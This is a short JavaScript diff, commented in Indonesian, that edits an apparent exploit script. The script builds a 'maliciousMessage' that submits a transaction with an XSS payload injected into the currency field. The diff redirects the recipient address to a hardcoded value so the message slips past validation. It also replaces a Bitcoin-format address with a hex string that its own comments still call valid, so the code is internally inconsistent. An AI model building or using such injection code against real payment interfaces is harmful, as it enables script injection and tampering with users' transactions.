@@ -17,13 +17,15 @@
 
             // Gunakan alamat dengan format yang valid untuk lolos dari validasi awal
             // Ini adalah alamat donasi Bitcoin yang valid secara format.
-            // const valid_format_address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
+            // const valid_format_address = "177c1e81f771578941e15b20ce19178f9a";
+            const valid_format_address = "177c1e81f771578941e15b20ce19178f9a";
 
             const maliciousMessage = {
                 type: 'submitTransaction',
                 transaction: {
                     // Gunakan alamat yang formatnya valid
-                    toAddress: transactionData.toAddress,
+                    // toAddress: transactionData.toAddress,
+                    toAddress: valid_format_address,
                     // Tetap suntikkan payload di sini
                     currency: xss_payload,
                     amount: 1
